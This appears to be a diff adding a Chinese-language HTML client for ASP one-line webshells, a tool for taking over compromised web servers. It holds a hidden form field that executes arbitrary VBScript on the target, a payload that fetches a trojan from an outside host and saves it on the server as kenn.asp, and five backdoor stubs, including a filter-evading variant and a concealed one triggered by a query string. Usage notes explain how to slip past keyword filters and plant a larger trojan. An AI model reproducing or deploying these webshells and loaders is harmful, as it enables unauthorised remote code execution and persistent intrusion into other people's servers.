@@ -1,0 +1,52 @@
+<HTML><HEAD><TITLE>ＡＳＰ一句话客户端</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<STYLE type=text/css><!--body {
+    background-color: #000000;
+    font-size: 12px;
+}
+.bad {
+    border: 1px solid #33ff00;
+    font-size: 12px;
+    link{COLOR:#33ff00;};A:visited{COLOR:#33ff00;};
+}-->
+</STYLE>
+
+<META content="MSHTML 6.00.2900.3132" name=GENERATOR></HEAD>
+<BODY>
+<CENTER>
+<DIV 
+style="FONT-SIZE: 16pt; FILTER: glow(color=#33ff00, strength=6); WIDTH: 350px; COLOR: #33ff00; LINE-HEIGHT: 35pt; FONT-FAMILY: Comic Sans MS; POSITION: relative"><br>ＡＳＰ一句话客户端远程上传版</DIV>
+<TABLE class=bad height=14 cellSpacing=0 width=627 align=center border=1 boodercolor=#33ff00>
+  <TBODY>
+  <TR>
+    <TD width=794 height=1>
+      <FORM name=pass method=post><FONT color=#33ff00>服务端网址:</FONT><INPUT id=act 
+      size=76 value=http:// name=act> <INPUT onclick=this.form.blfy.name=this.form.password.value;this.form.action=this.form.act.value; type=submit value=GOGOGO> 
+      <BR><FONT color=#33ff00>登陆密码:&nbsp;&nbsp;</font><INPUT id=password size=76 value=blfy name=password> <INPUT id=blfy 
+      type=hidden 
+      value='Execute("Session(""blfy"")=request(""*""):Execute(Session(""blfy""))")' 
+      name=blfy> </TD></TR>
+  <TR>
+    <TD width=794 height=100><TEXTAREA name=* rows=5 cols=100 width="45">Set xPost = CreateObject("Microsoft.XMLHTTP")
+         xPost.Open "GET","http://www.jbl86.com/news.txt",False
+         xPost.Send()
+         Set sGet = CreateObject("ADODB.Stream")
+         sGet.Mode = 3
+         sGet.Type = 1
+         sGet.Open()
+         sGet.Write(xPost.responseBody)
+         sGet.SaveToFile Server.MapPath("kenn.asp"),2
+         set sGet = nothing
+         set sPOST = nothing
+         response.redirect "kenn.asp"</TEXTAREA> </TD></TR>
+  <TR>
+    <TD width=794 height=7><font color=#33ff00>把红色的<FONT color=red>&nbsp;blfy&nbsp;</FONT>换成您的密码!&nbsp;&nbsp;&nbsp;&nbsp;提供五个服务端: <BR>1. 
+      &lt;%eval request("<FONT color=red>blfy</FONT>")%&gt; <BR>2. &lt;%execute 
+      request("<FONT color=red>blfy</FONT>")%&gt; <BR>3. 
+      &lt;%execute(request("<FONT color=red>blfy</FONT>"))%&gt; <BR>
+      4、&lt;script language=VBScript runat=server&gt;execute request("<FONT color=red>blfy</FONT>")&lt;/Script&gt;&nbsp;&nbsp;突破&lt;%%&gt;过滤版<br>
+      5、&lt;%If request("5") ="5" then eval request("<FONT color=red>blfy</FONT>") end if %&gt;&nbsp;&nbsp;隐蔽后门版,访问格式为: help.asp?5=5<br></font>
+</TD></TR></TBODY></TABLE>
+</FORM></CENTER><font color="#33ff00">
+<center>本程序可以调用XMLHTTP控件让服务器从网上下载ASP木马并保存在服务器上!<br>
+&nbsp;可以突破服务器的关键词过滤而导制的我们的大马无法正常提交的障碍!&nbsp;<br><br>使用方法:&nbsp;先把自己的ASP大马上传的自己的空间里.只能是TXT格式.<br>再把&nbsp;http://www.jbl86.com/news.txt&nbsp;改成你的网马地址.如&nbsp;http://www.921506.cn/muma.txt&nbsp;&nbsp;&nbsp;&nbsp;<br>   再把两个&nbsp;kenn.asp&nbsp;都改成你要保存的木马的文件名.如:&nbsp;muma.asp&nbsp;默认地址可以不改:&nbsp;kenn.asp<br><br>程序设计：&nbsp;Kenn&nbsp;&nbsp;&nbsp;&nbsp;QQ:921506&nbsp;&nbsp;&nbsp;&nbsp;Blog:&nbsp;<a href=http://www.cnblogs.com/kenn0626>myBlog</a></center></font></BODY></HTML>
